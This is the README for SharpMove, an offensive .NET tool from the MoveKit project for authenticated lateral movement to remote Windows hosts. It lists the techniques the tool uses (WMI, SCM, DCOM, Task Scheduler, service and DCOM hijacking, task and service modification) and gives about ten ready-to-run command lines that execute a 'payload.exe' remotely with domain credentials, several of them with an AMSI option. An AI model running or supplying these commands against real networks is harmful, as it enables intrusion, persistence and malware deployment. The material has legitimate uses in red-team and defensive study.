
### SharpMove - .NET authenticated execution for remote hosts


#### Building
To compile open Visual Studio project and compile for release.

#### Options

  * WMI
  * SCM
  * DCOM (Multiple)
  * Task Scheduler
  * Service DLL Hijack
  * DCOM Server Hijack
  * Modify Scheduled Task
  * Modify Service binpath

```
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
```

```
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
```

```
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```

```
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```

```
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```

```
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

```
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
```

```
SharpMove.exe action=modschtask computername=remote.host.local command="C:\windows\temp\payload.exe" username=domain\user password=password taskname=TestTask
```

```
SharpMove.exe action=hijackdcom computername=remote.host.local clsid={40bdc4e5-d532-42e6-b667-1ab890fdebcf}
```

```
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

Part of [MoveKit](https://github.com/0xthirteen/MoveKit)
       